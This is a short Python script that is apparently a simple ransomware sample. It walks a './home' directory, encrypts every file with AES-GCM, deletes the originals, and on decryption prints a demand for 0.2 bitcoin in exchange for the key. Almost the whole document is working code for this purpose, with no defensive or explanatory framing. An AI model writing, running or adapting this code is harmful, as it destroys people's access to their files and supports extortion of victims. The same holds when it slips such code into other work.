import os
import struct
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    
    nonce = get_random_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    with open(file_path + '.enc', 'wb') as f:
        for x in (nonce, tag, ciphertext):
            f.write(x)
    
    os.remove(file_path)
    print(f"Encrypted {file_path}")

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        nonce, tag, ciphertext = [ f.read(x) for x in (12, 16, -1) ]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    with open(file_path[:-4], 'wb') as f:
        f.write(data)
    
    os.remove(file_path)
    print(f"Decrypted {file_path}")

def main():
    key = b"thisisthesecretkeythatwillbeused"[:32]
    choice = input("Do you want to (e)ncrypt or (d)ecrypt the files? ")

    if choice.lower() == 'd':
        print("Please send me 0.2 btc and I will send you the key :)")
        key = input("Key: ").encode('utf-8')

    for root, dirs, files in os.walk("./home"):
        for file in files:
            file_path = os.path.join(root, file)
            if choice.lower() == 'e':
                encrypt_file(file_path, key)
            elif choice.lower() == 'd' and file.endswith(".enc"):
                decrypt_file(file_path, key)

if __name__ == "__main__":
    main()
